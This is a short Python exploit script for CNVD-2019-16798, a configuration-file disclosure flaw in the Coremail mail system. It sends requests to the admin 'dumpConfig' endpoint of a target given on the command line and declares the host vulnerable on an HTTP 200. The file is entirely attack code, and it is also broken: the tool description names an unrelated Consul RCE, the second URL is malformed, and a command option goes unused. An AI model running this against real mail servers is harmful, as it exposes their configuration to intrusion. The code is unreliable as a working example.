'''
CNVD-2019-16798 Coremail邮件系统配置文件信息泄露漏洞
writen by ophxc
'''
import requests
import argparse
import json
parser=argparse.ArgumentParser(description="consul-rexec-rce")
parser.add_argument("-u","--url",help="the target url",required=True)
parser.add_argument("-c","--command",help="the command you want to excute")
args=parser.parse_args()

url=args.url
url="http://"+url+"/mailsms/s?func=ADMIN:appState&dumpConfig=/"
url1="httpL//"+url+"/s?func=ADMIN:appState&dumpConfig=/"

res1=requests.get(url=url)
res2=requests.get(url=url1)

if res1.status_code==200 or res2.status_code==200:
    print("it's vu;nable")